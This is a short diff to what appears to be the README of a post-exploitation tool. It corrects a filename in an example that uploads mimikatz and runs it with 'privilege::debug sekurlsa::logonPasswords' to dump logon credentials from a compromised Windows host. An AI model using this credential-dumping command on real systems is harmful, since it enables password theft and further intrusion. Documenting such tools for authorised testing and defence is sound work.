@@ -21,7 +21,7 @@ A post-exploitation tool like mimikatz can also be uploaded and run to extract p
 
 ```
 >>> upload ../mimikatz.exe
->>> %TEMP%\mimi.exe privilege::debug sekurlsa::logonPasswords exit
+>>> %TEMP%\mimikatz.exe privilege::debug sekurlsa::logonPasswords exit
 ```
 
 ## Requirements
